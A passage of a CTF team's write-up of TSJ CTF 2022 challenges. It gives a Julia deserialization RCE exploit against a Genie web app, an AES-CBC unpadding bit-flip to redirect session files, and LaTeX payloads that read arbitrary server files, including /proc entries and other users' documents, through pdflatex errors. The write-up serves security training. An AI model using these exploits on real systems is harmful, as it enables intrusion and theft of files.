+<a href="https://docs.julialang.org/en/v1/stdlib/Serialization/">https://docs.julialang.org/en/v1/stdlib/Serialization/</a>
+So probably it is some kind of deserialization and trigger RCE like the pickle in python or POP chain in PHP:
+<a href="https://cwe.mitre.org/data/definitions/502.html">https://cwe.mitre.org/data/definitions/502.html</a>
+Let's search for this in Julia and see whether there are some PoCs already. It turns out that there is an issue in GitHub opened since 2019... lol
+<a href="https://github.com/JuliaLang/julia/issues/32601">https://github.com/JuliaLang/julia/issues/32601</a>
+To test the PoC, we first run the code stated in the issue on the local server, and then replace the session file we found on the local server to the PoC outputed file, and then visit the home page to trigger the session loading. Then we see this in the error log:</p>
+<pre tabindex="0"><code>web_1  | ┌ Error: KeyError(:REQUEST)
+web_1  | └ @ Genie.AppServer ~/.julia/packages/Genie/drXWm/src/AppServer.jl:120
+web_1  | 2022/02/27 15:43:01 [error] 16#16: *6 upstream prematurely closed connection while reading response header from upstream, client: 172.27.0.1, server: , request: &#34;GET / HTTP/1.1&#34;, upstream: &#34;http://127.0.0.1:8888/&#34;, host: &#34;localhost:8888&#34;
+web_1  | root:x:0:0:root:/root:/bin/bash
+web_1  | daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+web_1  | bin:x:2:2:bin:/bin:/usr/sbin/nologin
+web_1  | sys:x:3:3:sys:/dev:/usr/sbin/nologin</code></pre>
+<p>... It works pretty well! Since it only shows the execution result in the error log, probably we need to set up a requestbin to catch the flag after RCE. But to be more convenient to our team members, we can just copy the flag to the <code>uploads</code> folder on the server and then use the native feature to download the flag, so we don't even need external connection lol. Here is the exploit code based on the PoC:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-julia" data-lang="julia"><span style="color:#66d9ef">using</span> Serialization
+
+Serialization<span style="color:#f92672">.</span>deserialize(s<span style="color:#f92672">::</span><span style="color:#66d9ef">Serializer</span>, t<span style="color:#f92672">::</span><span style="color:#66d9ef">Type</span>{<span style="color:#66d9ef">BigInt</span>})<span style="color:#f92672">=</span>run(<span style="color:#e6db74">`sh -c &#39;cp /app/flag* /app/uploads/flag&#39;`</span>);
+
+filt<span style="color:#f92672">=</span>filter(methods(Serialization<span style="color:#f92672">.</span>deserialize)<span style="color:#f92672">.</span>ms) <span style="color:#66d9ef">do</span> m
+       <span style="color:#66d9ef">String</span>(m<span style="color:#f92672">.</span>file)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;R&#39;</span> <span style="color:#66d9ef">end</span>;
+
+Serialization<span style="color:#f92672">.</span>serialize(<span style="color:#e6db74">&#34;poc.serialized_jl&#34;</span>, (filt[<span style="color:#ae81ff">1</span>], <span style="color:#66d9ef">BigInt</span>(<span style="color:#ae81ff">7</span>)));</code></pre></div>
+<p>The only difference is the command. For some reason you cannot directly use special character when you use the <code>run</code> function (or maybe a language construct? I don't even know wtf is that... lol). The special characters need to be quoted. So if you just use <code>cp /app/flag* /app/uploads/flag</code> then it will try to copy the file called <code>flag*</code> instead of the actual flag file with random file name. So we need to use <code>sh -c</code> here.</p>
+
+<p>After that we need to fix the crypto part.</p>
+
+<p>The server is slow due to weird behavior of nginx, and it just has 600 seconds timeout.</p>
+
+<h3 id="finding-the-actual-crypto-bug">Finding the actual crypto bug<a hidden class="anchor" aria-hidden="true" href="#finding-the-actual-crypto-bug">#</a></h3>
+
+<p><em>From Mystiz's perspective</em></p>
+
+<p>I thought it was a padding oracle, but it is not. Let's read the source code on how a session ID is converted to a cookie:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-julia" data-lang="julia"><span style="color:#75715e"># https://github.com/GenieFramework/Genie.jl/blob/v4.15.2/src/session_adapters/FileSession.jl#L68-L89</span>
+
+<span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">    read(session_id::Union{String,Symbol}) :: Union{Nothing,Genie.Sessions.Session}
+</span><span style="color:#e6db74">    read(session::Genie.Sessions.Session) :: Union{Nothing,Genie.Sessions.Session}
+</span><span style="color:#e6db74">Attempts to read from file the session object serialized as `session_id`.
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+<span style="color:#66d9ef">function</span> read(session_id<span style="color:#f92672">::</span><span style="color:#66d9ef">Union</span>{<span style="color:#66d9ef">String</span>,<span style="color:#66d9ef">Symbol</span>}) <span style="color:#f92672">::</span> <span style="color:#66d9ef">Union</span>{<span style="color:#66d9ef">Nothing</span>,<span style="color:#66d9ef">Genie</span><span style="color:#f92672">.</span><span style="color:#66d9ef">Sessions</span><span style="color:#f92672">.</span><span style="color:#66d9ef">Session</span>}
+  isfile(joinpath(SESSIONS_PATH, session_id)) <span style="color:#f92672">||</span> <span style="color:#66d9ef">return</span> nothing
+
+  <span style="color:#66d9ef">try</span>
+    open(joinpath(SESSIONS_PATH, session_id), <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">do</span> (io)
+      Serialization<span style="color:#f92672">.</span>deserialize(io)
+    <span style="color:#66d9ef">end</span>
+  <span style="color:#66d9ef">catch</span> ex
+    <span style="color:#a6e22e">@error</span> <span style="color:#e6db74">&#34;Can&#39;t read session&#34;</span>
+    <span style="color:#a6e22e">@error</span> ex
+  <span style="color:#66d9ef">end</span>
+<span style="color:#66d9ef">end</span>
+
+<span style="color:#66d9ef">function</span> read(session<span style="color:#f92672">::</span><span style="color:#66d9ef">Genie</span><span style="color:#f92672">.</span>Sessions<span style="color:#f92672">.</span>Session) <span style="color:#f92672">::</span> <span style="color:#66d9ef">Union</span>{<span style="color:#66d9ef">Nothing</span>,<span style="color:#66d9ef">Genie</span><span style="color:#f92672">.</span><span style="color:#66d9ef">Sessions</span><span style="color:#f92672">.</span><span style="color:#66d9ef">Session</span>}
+  read(session<span style="color:#f92672">.</span>id)
+<span style="color:#66d9ef">end</span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-julia" data-lang="julia"><span style="color:#75715e"># https://github.com/GenieFramework/Genie.jl/blob/v4.15.2/src/Sessions.jl#L59-L71</span>
+
+<span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">    id(payload::Union{HTTP.Request,HTTP.Response}) :: String
+</span><span style="color:#e6db74">Attempts to retrieve the session id from the provided `payload` object.
+</span><span style="color:#e6db74">If that is not available, a new session id is created.
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+<span style="color:#66d9ef">function</span> id(payload<span style="color:#f92672">::</span><span style="color:#66d9ef">Union</span>{<span style="color:#66d9ef">HTTP</span><span style="color:#f92672">.</span><span style="color:#66d9ef">Request</span>,<span style="color:#66d9ef">HTTP</span><span style="color:#f92672">.</span><span style="color:#66d9ef">Response</span>}) <span style="color:#f92672">::</span> <span style="color:#66d9ef">String</span>
+  (Genie<span style="color:#f92672">.</span>Cookies<span style="color:#f92672">.</span>get(payload, Genie<span style="color:#f92672">.</span>config<span style="color:#f92672">.</span>session_key_name) <span style="color:#f92672">!==</span> nothing) <span style="color:#f92672">&amp;&amp;</span>
+    <span style="color:#f92672">!</span> isempty(Genie<span style="color:#f92672">.</span>Cookies<span style="color:#f92672">.</span>get(payload, Genie<span style="color:#f92672">.</span>config<span style="color:#f92672">.</span>session_key_name)) <span style="color:#f92672">&amp;&amp;</span>
+      <span style="color:#66d9ef">return</span> Genie<span style="color:#f92672">.</span>Cookies<span style="color:#f92672">.</span>get(payload, Genie<span style="color:#f92672">.</span>config<span style="color:#f92672">.</span>session_key_name)
+
+  id()
+<span style="color:#66d9ef">end</span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-julia" data-lang="julia"><span style="color:#75715e"># https://github.com/GenieFramework/Genie.jl/blob/v4.15.2/src/Cookies.jl#L28-L42</span>
+
+<span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">    get(res::HTTP.Response, key::Union{String,Symbol}) :: Union{Nothing,String}
+</span><span style="color:#e6db74">Retrieves a value stored on the cookie as `key` from the `Respose` object.
+</span><span style="color:#e6db74"># Arguments
+</span><span style="color:#e6db74">- `payload::Union{HTTP.Response,HTTP.Request}`: the request or response object containing the Cookie headers
+</span><span style="color:#e6db74">- `key::Union{String,Symbol}`: the name of the cookie value
+</span><span style="color:#e6db74">- `encrypted::Bool`: if `true` the value stored on the cookie is automatically decrypted
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+<span style="color:#66d9ef">function</span> get(res<span style="color:#f92672">::</span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">.</span>Response, key<span style="color:#f92672">::</span><span style="color:#66d9ef">Union</span>{<span style="color:#66d9ef">String</span>,<span style="color:#66d9ef">Symbol</span>}; encrypted<span style="color:#f92672">::</span><span style="color:#66d9ef">Bool</span> <span style="color:#f92672">=</span> true) <span style="color:#f92672">::</span> <span style="color:#66d9ef">Union</span>{<span style="color:#66d9ef">Nothing</span>,<span style="color:#66d9ef">String</span>}
+  (haskey(HTTPUtils<span style="color:#f92672">.</span><span style="color:#66d9ef">Dict</span>(res), <span style="color:#e6db74">&#34;Set-Cookie&#34;</span>) <span style="color:#f92672">||</span> haskey(HTTPUtils<span style="color:#f92672">.</span><span style="color:#66d9ef">Dict</span>(res), <span style="color:#e6db74">&#34;set-cookie&#34;</span>)) <span style="color:#f92672">?</span>
+    nullablevalue(res, key, encrypted <span style="color:#f92672">=</span> encrypted) <span style="color:#f92672">:</span>
+      nothing
+<span style="color:#66d9ef">end</span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-julia" data-lang="julia"><span style="color:#75715e"># https://github.com/GenieFramework/Genie.jl/blob/v4.15.2/src/Cookies.jl#L135-L157</span>
+
+<span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">    nullablevalue(payload::Union{HTTP.Response,HTTP.Request}, key::Union{String,Symbol}; encrypted::Bool = true)
+</span><span style="color:#e6db74">Attempts to retrieve a cookie value stored at `key` in the `payload object` and returns a `Union{Nothing,String}`
+</span><span style="color:#e6db74"># Arguments
+</span><span style="color:#e6db74">- `payload::Union{HTTP.Response,HTTP.Request}`: the request or response object containing the Cookie headers
+</span><span style="color:#e6db74">- `key::Union{String,Symbol}`: the name of the cookie value
+</span><span style="color:#e6db74">- `encrypted::Bool`: if `true` the value stored on the cookie is automatically decrypted
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+<span style="color:#66d9ef">function</span> nullablevalue(payload<span style="color:#f92672">::</span><span style="color:#66d9ef">Union</span>{<span style="color:#66d9ef">HTTP</span><span style="color:#f92672">.</span><span style="color:#66d9ef">Response</span>,<span style="color:#66d9ef">HTTP</span><span style="color:#f92672">.</span><span style="color:#66d9ef">Request</span>}, key<span style="color:#f92672">::</span><span style="color:#66d9ef">Union</span>{<span style="color:#66d9ef">String</span>,<span style="color:#66d9ef">Symbol</span>}; encrypted<span style="color:#f92672">::</span><span style="color:#66d9ef">Bool</span> <span style="color:#f92672">=</span> true) <span style="color:#f92672">::</span> <span style="color:#66d9ef">Union</span>{<span style="color:#66d9ef">Nothing</span>,<span style="color:#66d9ef">String</span>}
+  <span style="color:#66d9ef">for</span> cookie <span style="color:#66d9ef">in</span> split(<span style="color:#66d9ef">Dict</span>(payload)[<span style="color:#e6db74">&#34;cookie&#34;</span>], <span style="color:#e6db74">&#39;;&#39;</span>)
+    cookie <span style="color:#f92672">=</span> strip(cookie)
+    <span style="color:#66d9ef">if</span> startswith(lowercase(cookie), lowercase(string(key)))
+      value <span style="color:#f92672">=</span> split(cookie, <span style="color:#e6db74">&#39;=&#39;</span>)[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">|&gt;</span> <span style="color:#66d9ef">String</span>
+      encrypted <span style="color:#f92672">&amp;&amp;</span> (value <span style="color:#f92672">=</span> Genie<span style="color:#f92672">.</span>Encryption<span style="color:#f92672">.</span>decrypt(value))
+
+      <span style="color:#66d9ef">return</span> string(value)
+    <span style="color:#66d9ef">end</span>
+  <span style="color:#66d9ef">end</span>
+
+  nothing
+<span style="color:#66d9ef">end</span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-julia" data-lang="julia"><span style="color:#75715e"># https://github.com/GenieFramework/Genie.jl/blob/v4.15.2/src/Encryption.jl#L24-L35</span>
+
+<span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">    decrypt(s::String) :: String
+</span><span style="color:#e6db74">Decrypts `s` (a `string` previously encrypted by Genie).
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+<span style="color:#66d9ef">function</span> decrypt(s<span style="color:#f92672">::</span><span style="color:#66d9ef">String</span>) <span style="color:#f92672">::</span> <span style="color:#66d9ef">String</span>
+  (key32, iv16) <span style="color:#f92672">=</span> encryption_sauce()
+  decryptor <span style="color:#f92672">=</span> Nettle<span style="color:#f92672">.</span>Decryptor(ENCRYPTION_METHOD, key32)
+  deciphertext <span style="color:#f92672">=</span> Nettle<span style="color:#f92672">.</span>decrypt(decryptor, <span style="color:#e6db74">:CBC</span>, iv16, s <span style="color:#f92672">|&gt;</span> hex2bytes)
+
+  <span style="color:#66d9ef">String</span>(Nettle<span style="color:#f92672">.</span>trim_padding_PKCS5(deciphertext))
+<span style="color:#66d9ef">end</span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-julia" data-lang="julia"><span style="color:#75715e"># https://github.com/JuliaCrypto/Nettle.jl/blob/v0.5.0/src/cipher.jl#L90-L93</span>
+
+<span style="color:#66d9ef">function</span> trim_padding_PKCS5(data<span style="color:#f92672">::</span><span style="color:#66d9ef">Vector</span>{<span style="color:#66d9ef">UInt8</span>})
+  padlen <span style="color:#f92672">=</span> data[sizeof(data)]
+  <span style="color:#66d9ef">return</span> data[<span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>sizeof(data)<span style="color:#f92672">-</span>padlen]
+<span style="color:#66d9ef">end</span></code></pre></div>
+<p>In short, <code>__geniesid</code> is the ciphertext of the relative path for the session file. It uses the decryptor from <em>Nettle.jl</em> to decrypt ciphertext with AES-CBC and unpad. Notably, <em>Nettle.jl</em>'s unpad it reads the last character (denoted by $\rho$) and simply remove the last $\rho$ characters from the plaintext. It <em>does not</em> checks if the padding is correct under PKCS5.</p>
+
+<p>Since the session ID is 64 characters long, the ciphertext would be 80 bytes long. In particular, if $c_4$ and $c_5$ represents the fourth and the fifth blocks and $\text{pad}$ is <code>10 10 ... 10</code>, we have:</p>
+
+<p><span  class="math">\[\text{Enc}(c_4 \oplus \text{pad}) = c_5\]</span></p>
+
+<p>If we flip the last byte of $c_4$ by <code>0x10 XOR 0x4f</code>, we would obtain a plaintext which is the first <em>byte</em> of the current plaintext. After all, we have the following algorithm:</p>
+
+<ol>
+<li>Upload 16 malicious sessions to <code>../uploads/0</code>, <code>../uploads/1</code>, ..., <code>../uploads/f</code> (yes, @grhkm was correct.)</li>
+<li>Get a session and flip the last byte of $c_4$ by <code>0x5f = 0x10 XOR 0x4f</code>. We then have the session ID being <code>0</code>, <code>1</code>, ..., or <code>f</code>, which will point to the malicious session.</li>
+<li>Use the malicious session and visit a page.</li>
+<li>Read the flag at <code>http://[HOST]/uploads/flag</code></li>
+</ol>
+
+<div class="alert warning">
+  I will write a blog post on the cryptographic details later.
+</div>
+  
+
+<h2 id="remote-code-texecution-1">Remote Code TeXecution 1<a hidden class="anchor" aria-hidden="true" href="#remote-code-texecution-1">#</a></h2>
+
+<p><em>Solved by harrier and Ozetta; writeup compiled by Ozetta.</em></p>
+
+<p><strong>When I was attempting this challenge, the source code was not released.</strong></p>
+
+<p>Few months ago some of our team member added a Discord Bot called &quot;TeXit&quot; to render LaTeX output on Discord... lol it just looks too similar to the current challenge. A day after the Bot is introduced, I managed to craft a payload that can read any files on the server and steal other user's output. The bug is reported to the developers of TeXit and they replied that it is an expected behavior. Well looks like we have some endowment to use for this challenge:</p>
+<pre tabindex="0"><code>\makeatletter
+\def\protected@iwrite#1#2#3{%
+  \begingroup\set@display@protect
+  #2% local assignments
+  \immediate\write#1{#3}\endgroup}
+
+\newwrite\tempfile
+\immediate\openout\tempfile=z.tex
+\protected@iwrite\tempfile{}{\protect\begin{verbatim}}
+
+\newread\file
+\openin\file=../(Discord_User_ID)/(Discord_User_ID).tex
+\newcount\foo
+\foo=0
+\loop\unless\ifeof\file
+    \advance \foo +1
+    \read\file to\fileline
+    \ifnum \foo &gt; 53
+    \protected@iwrite\tempfile{}{\fileline}
+    \fi
+\repeat
+\closein\file</code></pre>
+<p>The funny <code>&gt;53</code> is to remove the headers added by the Bot, and we will see later on that it is very useful in this challenge. So I just replace the filename in our old payload to check <code>/proc/self/stat</code>. It shows</p>
+<pre tabindex="0"><code>Error
+The bot thinks your file is insecure
+backslash detected!</code></pre>
+<p>I also tried <code>/proc/self/exe</code> and it shows</p>
+<pre tabindex="0"><code>Compilation failed
+! Text line contains an invalid character.
+&lt;read 2&gt; ^^?
+            ELF^^B^^A^^A^^@^^@^^@^^@^^@^^@^^@^^@^^@^^C^^@&gt;^^@^^A^^@^^@^^@@!^...
+l.21 \repeat
+            
+? 
+! Emergency stop.
+&lt;read 2&gt; ^^?
+            ELF^^B^^A^^A^^@^^@^^@^^@^^@^^@^^@^^@^^@^^C^^@&gt;^^@^^A^^@^^@^^@@!^...
+l.21 \repeat
+            
+!  ==&gt; Fatal error occurred, no output PDF file produced!
+Transcript written on output.log.
+Output PDF not found.</code></pre>
+<p>And <code>/proc/self/cmdline</code> shows</p>
+<pre tabindex="0"><code>! Text line contains an invalid character.
+&lt;read 2&gt; pdflatex^^@
+                    -no-shell-escape^^@-jobname^^@output^^@__document.tex^^@
+l.21 \repeat
+            
+? 
+! Emergency stop.
+&lt;read 2&gt; pdflatex^^@
+                    -no-shell-escape^^@-jobname^^@output^^@__document.tex^^@
+l.21 \repeat
+            
+!  ==&gt; Fatal error occurred, no output PDF file produced!
+Transcript written on output.log.
+Output PDF not found.</code></pre>
+<p>Thanks it is pdflatex, I should know that already based on the experience from TeXit.</p>
+
+<p>Looks like it only got output whenever there is an error. So those verbatim tricks from the old payload didn't work well. I just left the challenge alone and after the author released a hint about procfs, probably we are still on the right track... Then after that I found a shit way to force the error output:</p>
+
+<p><code>\PackageError{mypackage}{\fileline}{asdf}</code></p>
+
+<p>So instead of writing to a tempfile, we can throw exception like this to see the output.
+I am too lazy so I just add one extra line like this lol:</p>
+<pre tabindex="0"><code>\makeatletter
+\def\protected@iwrite#1#2#3{%
+  \begingroup\set@display@protect
+  #2% local assignments
+  \immediate\write#1{#3}\endgroup}
+
+\newwrite\tempfile
+\immediate\openout\tempfile=z.tex
+
+\newread\file
+\openin\file=/proc/self/stat
+\newcount\foo
+\foo=0
+\loop\unless\ifeof\file
+    \advance \foo +1
+    \read\file to\fileline
+    \ifnum \foo &gt; 0
+    \PackageError{zzz}{\fileline}{xxx}
+    \protected@iwrite\tempfile{}{\fileline}
+    \fi
+\repeat
+\closein\file
+
+\immediate\closeout\tempfile
+\input{z.tex}</code></pre>
+<p>Reading <code>/proc/self/stat</code> gives this:</p>
+<pre tabindex="0"><code>! Package zzz Error: 16150 (pdflatex) R 16149 16145 16145 0 -1 4194560 4455 0 0
+ 0 6 0 0 0 20 0 1 0 14499616 104087552 5380 18446744073709551615 94604983250944
+ 94604984547965 140730182785440 0 0 0 0 0 2 0 0 0 17 3 0 0 0 0 0 94604984940784
+ 94604985236168 94605006471168 140730182790653 140730182790710 140730182790710 
+140730182791142 0 .</code></pre>
+<p>I guess there is a script that spawns the pdflatex, so reading the parent process' cmdline should shows the source path. Upload another file and render again gives another pid that is 11 more than the previous one. So let's say we have pid 16150 for <code>/proc/self/stat</code> (from the previous example), we should leak <code>/proc/16160/cmdline</code> to see the source code path. Then this is what we get:</p>
+<pre tabindex="0"><code>! Text line contains an invalid character.
+&lt;read 2&gt; /bin/sh^^@
+                   -c^^@pdflatex -no-shell-escape -jobname output __document...
+l.21 \repeat</code></pre>
+<p>Thanks it is <code>/bin/sh</code>! Should we find the flag inside? lol
+Then we check the parent process' id of that sh(it):</p>
+<pre tabindex="0"><code>! Package zzz Error: 16292 (sh) S 16290 16288 16288 0 -1 4194304 68 0 0 0 0 0 0
+ 0 20 0 1 0 14551347 2478080 128 18446744073709551615 94814411878400 9481441195
+3821 140730404898032 0 0 0 0 0 65538 1 0 0 17 4 0 0 0 0 0 94814411984688 948144
+11989568 94814436925440 140730404900389 140730404900477 140730404900477 1407304
+04900848 0 .</code></pre>
+<p>Got a difference of 2, so next time maybe just 11-1-2 = 8, which actually gives this shit:</p>
+<pre tabindex="0"><code>/usr/bin/make^^@
+                         -s^^@-C^^@sandbox/ffdb9e807e2ef8fd656b_236028595565...
+l.21 \repeat</code></pre>
+<p>Haiya why not just brute force... ok the difference is 9:</p>
+<pre tabindex="0"><code>! Text line contains an invalid character.
+&lt;read 2&gt; python3^^@
+                   /workdir/YVvIaGD52z09nIZzXzvB.py^^@
+l.21 \repeat</code></pre>
+<p>Finally we got the source code's path. Then to leak the source code (well I am not aware of the source code is released by the author at the moment), we can do it line by line... But I don't want so I just copied a string concat macro:</p>
+<pre tabindex="0"><code>\makeatletter
+\def\protected@iwrite#1#2#3{%
+  \begingroup\set@display@protect
+  #2% local assignments
+  \immediate\write#1{#3}\endgroup}
+\def\mystring{} % initialize
+\def\extendmystring#1#2{\edef\mystring{#1\mystring#2}}
+
+\newwrite\tempfile
+\immediate\openout\tempfile=z.tex
+
+\newread\file
+\openin\file=/workdir/YVvIaGD52z09nIZzXzvB.py
+\newcount\foo
+\foo=0
+\loop\unless\ifeof\file
+    \advance \foo +1
+    \read\file to\fileline
+    \ifnum \foo &gt; 0
+      \ifnum \foo &lt; 10
+        \extendmystring{}{\fileline}
+        \extendmystring{}{FUCK}
+      \fi
+    \fi
+\repeat
+\PackageError{zzz}{\mystring}{xxx}
+\closein\file
+
+\immediate\closeout\tempfile
+\input{z.tex}</code></pre>
+<p>so the output should be a FUCK-separated text of the source code. And I keep requesting the Bot to leak the source code for about 20 lines at a time. Then the single quotes on lines 23 and 44 break the output. So I have to skip these lines manually. Finally I got a different error message from line 171, so looks like it is EOF? Or the <code>#</code> comment character breaks the output again. Then I went back to the team Discord channel to see what's going on and found that our team member harrier has already found the flag on line 171 quickly by viewing the released code.</p>
+
+<p>Here is the final payload to fix the <code>#</code>, using the catcode command to change the category of <code>#</code> char to be &quot;other&quot; so it doesnt get rendered badly:</p>
+<pre tabindex="0"><code>\makeatletter
+\def\protected@iwrite#1#2#3{%
+  \begingroup\set@display@protect
+  #2% local assignments
+  \immediate\write#1{#3}\endgroup}
+\def\mystring{} % initialize
+\def\extendmystring#1#2{\edef\mystring{#1\mystring#2}}
+\catcode`\#=12
+\newwrite\tempfile
+\immediate\openout\tempfile=z.tex
+
+\newread\file
+\openin\file=/workdir/YVvIaGD52z09nIZzXzvB.py
+\newcount\foo
+\foo=0
+\loop\unless\ifeof\file
+    \advance \foo +1
+    \read\file to\fileline
+    \ifnum \foo &gt; 170
+      \ifnum \foo &lt; 172
+        \extendmystring{}{\fileline}
+        \extendmystring{}{FUCK}
+      \fi
+    \fi
+\repeat
+\PackageError{zzz}{\mystring}{xxx}
+\closein\file
+
+\immediate\closeout\tempfile
+\input{z.tex}</code></pre>
+<p>lol why you still need to write a tempfile...</p>
+
+</div>
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://b6a.black/tags/ctf/">ctf</a></li>
+      <li><a href="https://b6a.black/tags/tsj-ctf/">tsj-ctf</a></li>
+    </ul>
+    <nav class="paginav">
+      <a class="next" href="https://b6a.black/posts/2021-11-04-hacklu-web/">
+        <span class="title">Next Page »</span>
+        <br>
+        <span>Hack.lu CTF 2021 Web Writeup</span>
+      </a>
+    </nav>
+  </footer>
+</article>
+<aside class="toc-container">
+  <a href="#" style="text-decoration: none; font-weight: 700;">
+    TSJ CTF 2022 Writeup
+  </a>
+  <div class="js-toc"></div>
+</aside>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.css" integrity="sha512-SFw7k74K3983tyOlJIHa8atr9Ppef3Kix5cmifwzU7ZdtU2E0FRuOVRtd3ENpMJ8sNCie5hlb/0j23efcdQJXA==" crossorigin="anonymous" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.js" integrity="sha512-oD3xGN8YTxenx6tdS4D/RKqO4OtORBQtAb2/FseM17GGMIi6jMwKUBc8duX4A5RwMOGGXoFBZrsqbOk8GpXFgQ==" crossorigin="anonymous"></script>
+
+<script type="text/javascript">
+  tocbot.init({
+    headingSelector: 'h1, h2, h3, h4',
+    orderedList: false,
+    headingLabelCallback: s => s.substr(0, s.length-1),
+    collapseDepth: 2
+  });
+</script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/viz.js/1.7.1/viz.js"> </script>
+<script type="text/javascript">
+  (function () {
+    const vizPrefix = "language-viz-";
+    Array.prototype.forEach.call(document.querySelectorAll("[class^=" + vizPrefix + "]"), function (x) {
+      let engine;
+      x.getAttribute("class").split(" ").forEach(function (cls) {
+        if (cls.startsWith(vizPrefix)) {
+          engine = cls.substr(vizPrefix.length);
+        }
+      });
+      const image = new DOMParser().parseFromString(Viz(x.innerText, { format: "svg", engine: engine }), "image/svg+xml");
+      x.parentNode.insertBefore(image.documentElement, x);
+      x.style.display = 'none'
+      x.parentNode.style.backgroundColor = "white"
+    });
+  })();
+</script>
+    </main><footer class="footer">
+    <span>&copy; 2022 <a href="https://b6a.black/">Black Bauhinia</a></span>
+    <span>&middot;</span>
+    <span>Powered by <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a></span>
+    <span>&middot;</span>
+    <span>Theme <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a></span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)">
+    <button class="top-link" id="top-link" type="button" accesskey="g">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+            <path d="M12 6H0l6-6z" />
+        </svg>
+    </button>
+</a>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"
+  integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"
+  integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"
+  integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"
+  onload="renderMathInElement(document.body, { delimiters: [{ left: '$$', right: '$$', display: true }, { left: '\\[', right: '\\]', display: true }, { left: '$', right: '$', display: false }, { left: '\\(', right: '\\)', display: false }]})"></script>
+
+
+
+<script defer src="/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<script>
+    window.onload = function () {
+        if (localStorage.getItem("menu-scroll-position")) {
+            document.getElementById('menu').scrollLeft = localStorage.getItem("menu-scroll-position");
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+    function menu_on_scroll() {
+        localStorage.setItem("menu-scroll-position", document.getElementById('menu').scrollLeft);
+    }
+
+</script>
+
+</body>
+
+</html>
